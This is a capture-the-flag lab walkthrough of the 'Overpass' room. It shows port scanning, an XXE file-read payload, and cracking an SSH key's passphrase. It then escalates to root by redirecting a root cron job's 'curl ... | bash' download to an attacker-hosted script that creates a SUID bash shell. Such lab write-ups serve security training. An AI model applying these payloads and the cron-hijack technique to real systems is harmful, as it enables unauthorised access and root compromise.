# Overpass Writeup by 1nsouciance (l1asis)
![Room Picture](./images/room.png)

><p style="font-size:20px;"><b><i>Choosing a hard-to-guess, but easy-to-remember password is important!</i></b></p>
>
> — <cite style="font-size:18px;">Kevin Mitnick</cite>

## Today's programme is going to be very interesting... Yes, you're right, it's my writeup for the ***Overpass*** room! Thank you for your time, take your seats and let's get started!

### As per tradition, I'll start with port enumeration using Nmap:
```bash
└─$ sudo nmap -sS -sV -p- <ip> -oN nmap_res
```

### Nmap result:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at <time> GMT
Nmap scan report for localhost (<ip>)
Host is up (0.046s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 18.08 seconds
```

### There's an http server and ssh enabled, what secrets does this website hide...?
![Screenshot](./images/screen1.png)

### Nothing interesting at first glance, my suggestion is to search through directories/subdirectories (if necessary).
```bash
└─$ gobuster dir -u "http://<ip>/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x=txt,php,js,png,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://<ip>/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              png,html,txt,php,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 301) [Size: 0] [--> ./]
/img                  (Status: 301) [Size: 0] [--> img/]
/login.js             (Status: 200) [Size: 1779]
/downloads            (Status: 301) [Size: 0] [--> downloads/]
/main.js              (Status: 200) [Size: 28]
/aboutus              (Status: 301) [Size: 0] [--> aboutus/]
/admin                (Status: 301) [Size: 42] [--> /admin/]
/admin.html           (Status: 200) [Size: 1525]
/css                  (Status: 301) [Size: 0] [--> css/]
/404.html             (Status: 200) [Size: 782]
/cookie.js            (Status: 200) [Size: 1502]
```

### Sweet! We've found an admin panel, so I don't think it's necessary to look in other subdirectories for now. Let's try to investigate it with BurpSuite, maybe there are some serious problems with this form... ?
![Screenshot](./images/screen2.png)

### Enabling Server Response and removing `js` from `Does not match` in rules for intercepting requests
![Screenshot](./images/screen3.png)

### I really don't think we need that `If-Modified-Since` at the bottom :\)
![Screenshot](./images/screen4.png)

### Maybe we can try our luck and hope that XML external entity (XXE) injection is present...?
```payload
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

### Let's send a normal POST request through the form and then change the `password` in our payload (we'll also need to URL-encode it using the `Ctrl+U` combination)
![Screenshot](./images/screen5.png)

### A-a-and....
![Screenshot](./images/screen6.png)

### What luck!!! We did not parse `/etc/passwd`, but the progress is still impressive. What we see is actually the private rsa key, let's save it and try to log in as user `james`, since the note is addressed to him...
```rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
                      ... redacted ...
-----END RSA PRIVATE KEY-----
```

### So, we have `id_rsa` file with private RSA key and the user is probably `james`, let's try to login via ssh:
```bash
└─$ sudo chmod 600 ./id_rsa
```

```bash
└─$ ssh -i id_rsa james@<ip>
```
![Screenshot](./images/screen7.png)

### Passphrase... No problem, JohnTheRipper will definitely help us!
```bash
└─$ ssh2john id_rsa > id_rsa.hash
```

```bash
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```
![Screenshot](./images/screen8.png)

### Success! Let's try logging in again:
```bash
james@overpass-prod:~$ echo "$(whoami) $(id) $(lsb_release -a)"
No LSB modules are available.
james uid=1001(james) gid=1001(james) groups=1001(james) Distributor ID:        Ubuntu
Description:    Ubuntu 18.04.4 LTS
Release:        18.04
Codename:       bionic
```

### Ho-ho-ho, we made it this far! Let's search for some interesting files and grab our first flag!
```bash
james@overpass-prod:~$ ls -lha
total 48K
drwxr-xr-x 6 james james 4.0K Jun 27  2020 .
drwxr-xr-x 4 root  root  4.0K Jun 27  2020 ..
lrwxrwxrwx 1 james james    9 Jun 27  2020 .bash_history -> /dev/null
-rw-r--r-- 1 james james  220 Jun 27  2020 .bash_logout
-rw-r--r-- 1 james james 3.7K Jun 27  2020 .bashrc
drwx------ 2 james james 4.0K Jun 27  2020 .cache
drwx------ 3 james james 4.0K Jun 27  2020 .gnupg
drwxrwxr-x 3 james james 4.0K Jun 27  2020 .local
-rw-r--r-- 1 james james   49 Jun 27  2020 .overpass
-rw-r--r-- 1 james james  807 Jun 27  2020 .profile
drwx------ 2 james james 4.0K Jun 27  2020 .ssh
-rw-rw-r-- 1 james james  438 Jun 27  2020 todo.txt
-rw-rw-r-- 1 james james   38 Jun 27  2020 user.txt
```

```bash
james@overpass-prod:~$ cat todo.txt
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```

```bash
james@overpass-prod:~$ cat user.txt 
thm{redacted}
```

### There's an interesting hidden file called `.overpass`, what's in it?
```bash
james@overpass-prod:~$ cat .overpass 
,LQ?2>6....redacted....iQD2J5C2H?=J:?8A:4EFC6QN.james@overpass-prod:~$
```

### ROT47 encoded data, maybe the overpass application is pre-installed on the machine... ?
```bash
james@overpass-prod:~$ find / -name "overpass*" 2>/dev/null
/usr/bin/overpass
```
![Screenshot](./images/screen9.png)

### Yup! And here's a password for us, as the note says: "Write down my password somewhere on a sticky note so that I don't forget it.", so the password for this `System` account is actually `james` password.
```bash
james@overpass-prod:~$ sudo -l
[sudo] password for james: 
Sorry, user james may not run sudo on overpass-prod.
```

### No sudo privileges =\) What if there's something in the crontab... ?
```bash
james@overpass-prod:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

### Great, there's a task that runs every minute as `root` and downloads the `buildscript.sh` bash script from `overpass.thm` and runs it with bash, jackpot! Let's find out if `/etc/hosts` is writable...
```bash
james@overpass-prod:/$ ls -lh /etc/hosts
-rw-rw-rw- 1 root root 252 Jan 26 23:37 /etc/hosts
```

### Indeed, `/etc/hosts` is writable, so let's start abusing it by pointing this `overpass.thm` domain to our attack machine's IP address:
![Screenshot](./images/screen10.png)

### Then we will recreate the same path and create the script that will make a SUID bash file copy for us:
```bash
└─$ mkdir downloads && mkdir ./downloads/src && echo "cp /bin/bash /home/james/rootbash; chmod +xs /home/james/rootbash" > ./downloads/src/buildscript.sh
```

### Start the HTTP server with python:
```bash
└─$ python -m http.server 80
```

![Screenshot](./images/screen11.png)

![Screenshot](./images/screen12.png)

### Hooray! Let's become `root` and grab our flag.
```bash
james@overpass-prod:~$ ./rootbash -p
rootbash-4.4# echo "$(whoami) $(id)"
root uid=1001(james) gid=1001(james) euid=0(root) egid=0(root) groups=0(root),1001(james)
rootbash-4.4# cat /root/root.txt 
thm{redacted}
rootbash-4.4# 
```

## **As always, I hope you enjoyed this writeup. Thanks for reading, stay safe! ^-^**